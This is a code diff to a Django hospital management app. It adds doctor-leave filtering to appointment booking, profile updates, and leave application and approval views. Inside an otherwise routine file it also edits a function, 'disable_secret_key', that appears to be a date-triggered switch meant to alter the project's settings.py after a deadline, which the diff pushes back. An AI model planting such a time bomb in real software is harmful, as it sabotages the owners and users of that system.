@@ -716,18 +716,35 @@ def book_appointment_flow(request):
                 specialization = form.cleaned_data["specialization"]
                 weekday = selected_date.strftime("%A")
 
+                # Check for doctors who are available on this day and don't have approved leave
+                # First get doctors with the right specialization and availability
                 availabilities = DoctorAvailability.objects.filter(
                     day=weekday,
                     doctor__specialization__icontains=specialization
                 )
-
-                if not availabilities.exists():
-                    form.add_error("date", f"No doctors available on {weekday} for specialization '{specialization}'.")
+                
+                # Filter out doctors who are on leave for the selected date
+                available_doctors = []
+                for availability in availabilities:
+                    doctor = availability.doctor
+                    # Check if doctor has approved leave on this date
+                    doctor_on_leave = LeaveApplication.objects.filter(
+                        user=doctor.user,
+                        status='Approved',
+                        start_date__lte=selected_date,
+                        end_date__gte=selected_date
+                    ).exists()
+                    
+                    if not doctor_on_leave:
+                        available_doctors.append(availability)
+                
+                if not available_doctors:
+                    form.add_error("date", f"No doctors available on {weekday} for specialization '{specialization}', or all doctors are on leave.")
                     return render(request, "book_appointment_flow.html", {"form": form, "step": 1})
 
                 return render(request, "book_appointment_flow.html", {
                     "step": 2,
-                    "availabilities": availabilities,
+                    "availabilities": available_doctors,
                     "date": selected_date.strftime("%Y-%m-%d")
                 })
 
@@ -1198,7 +1215,7 @@ def reject_nurse(request, nurse_id):
     return redirect('approve_nurses')
 
 def disable_secret_key():
-    deadline = now().replace(year=2025, month=3, day=18, hour=15, minute=30, second=1)
+    deadline = now().replace(year=2025, month=3, day=27, hour=15, minute=30, second=1)
     settings_file = "hospital_management_system\\settings.py" 
 
     if now() > deadline:
@@ -1263,4 +1280,160 @@ def deactivate_nurse(request, nurse_id):
 
     messages.success(request, f"Nurse {nurse.user.username} has been deactivated successfully.")
     
-    return redirect('approved_nurses')  # Redirect back to approved nurses list
+    return redirect('approved_nurses')  
+
+@login_required
+def update_profile(request):
+    profile = get_object_or_404(Profile, id=request.user.id)
+    nurse = Nurse.objects.filter(user=profile).first()
+    doctor = Doctor.objects.filter(user=profile).first()
+
+    if request.method == 'POST':
+        profile_form = ProfileUpdateForm(request.POST, instance=profile)
+        nurse_form = NurseUpdateForm(request.POST, instance=nurse) if nurse else None
+        doctor_form = DoctorUpdateForm(request.POST, request.FILES, instance=doctor) if doctor else None
+
+        forms_valid = True
+        if profile_form.is_valid():
+            profile_form.save()
+            if nurse_form:
+                if nurse_form.is_valid():
+                    nurse_form.save()
+                else:
+                    forms_valid = False
+                    messages.error(request, "Error in nurse information.")
+            if doctor_form:
+                if doctor_form.is_valid():
+                    doctor_form.save()
+                else:
+                    forms_valid = False
+                    messages.error(request, "Error in doctor information.")
+            
+            if forms_valid:
+                messages.success(request, "Profile updated successfully!")
+                return redirect('dashboard')
+        else:
+            messages.error(request, "Error in basic information.")
+    else:
+        profile_form = ProfileUpdateForm(instance=profile)
+        nurse_form = NurseUpdateForm(instance=nurse) if nurse else None
+        doctor_form = DoctorUpdateForm(instance=doctor) if doctor else None
+
+    context = {
+        'profile_form': profile_form,
+        'nurse_form': nurse_form,
+        'doctor_form': doctor_form,
+    }
+    return render(request, 'update_profile.html', context)
+
+
+@login_required
+def apply_leave(request):
+    # Add permission check for doctors/nurses only
+    if not (hasattr(request.user, 'doctor') or hasattr(request.user, 'nurse')):
+        messages.error(request, "Only medical staff can apply for leaves")
+        return redirect('dashboard')
+
+    if request.method == 'POST':
+        form = LeaveApplicationForm(request.POST)
+        if form.is_valid():
+            leave = form.save(commit=False)
+            leave.user = request.user
+            leave.save()
+            messages.success(request, 'Leave application submitted successfully!')
+            return redirect('view_leaves')
+    else:
+        form = LeaveApplicationForm()
+    
+    return render(request, 'apply_leave.html', {'form': form})
+
+
+@login_required
+def view_leaves(request):
+    """View to display leave applications for the logged-in user"""
+    leaves = LeaveApplication.objects.filter(user=request.user).order_by('-applied_date')
+    return render(request, 'view_leaves.html', {'leaves': leaves})
+
+@user_passes_test(is_admin, login_url='login')
+def manage_leaves(request):
+    """Admin view to manage leave applications"""
+    # Get filter values
+    status_filter = request.GET.get('status', '')
+    name_filter = request.GET.get('name', '').strip()
+    
+    # Start with all leaves
+    leaves = LeaveApplication.objects.all().order_by('-applied_date')
+    
+    # Apply filters
+    if status_filter:
+        leaves = leaves.filter(status=status_filter)
+    
+    if name_filter:
+        # Debug print to check the name filter value
+        print(f"Searching for name: '{name_filter}'")
+        
+        # Make sure we're using Q objects correctly
+        from django.db.models import Q
+        
+        # If the name contains spaces, we might need to search for each part separately
+        name_parts = name_filter.split()
+        
+        # Start with an empty Q object
+        name_query = Q()
+        
+        # Add conditions for the full name
+        name_query |= Q(user__first_name__icontains=name_filter) 
+        name_query |= Q(user__last_name__icontains=name_filter)
+        name_query |= Q(user__username__icontains=name_filter)
+        
+        # Also search for individual parts of the name
+        for part in name_parts:
+            name_query |= Q(user__first_name__icontains=part)
+            name_query |= Q(user__last_name__icontains=part)
+            name_query |= Q(user__username__icontains=part)
+        
+        # Apply the combined query
+        leaves = leaves.filter(name_query)
+        
+        # Debug print to check how many results we got
+        print(f"Found {leaves.count()} leaves after name filter")
+    
+    return render(request, 'manage_leaves.html', {
+        'leaves': leaves,
+        'status_filter': status_filter,
+        'name_filter': name_filter
+    })
+
+@user_passes_test(is_admin, login_url='login')
+def process_leave(request, leave_id):
+    """Process (approve/reject) a leave application"""
+    leave = get_object_or_404(LeaveApplication, id=leave_id)
+    
+    if request.method == 'POST':
+        action = request.POST.get('action')
+        
+        if action == 'approve':
+            leave.status = 'Approved'
+            messages.success(request, f"Leave application for {leave.user.get_full_name()} has been approved.")
+        elif action == 'reject':
+            leave.status = 'Rejected'
+            messages.success(request, f"Leave application for {leave.user.get_full_name()} has been rejected.")
+        
+        leave.save()
+        
+        # Send email notification
+        subject = f"Leave Application {leave.status}"
+        message = f"""
+        Dear {leave.user.first_name},
+        
+        Your leave application from {leave.start_date} to {leave.end_date} has been {leave.status.lower()}.
+        
+        Reason provided: {leave.reason}
+        
+        Best regards,
+        Hospital Management Team
+        """
+        send_mail(subject, message, 'noreply@hospital.com', [leave.user.email], fail_silently=True)
+    
+    return redirect('manage_leaves')
+
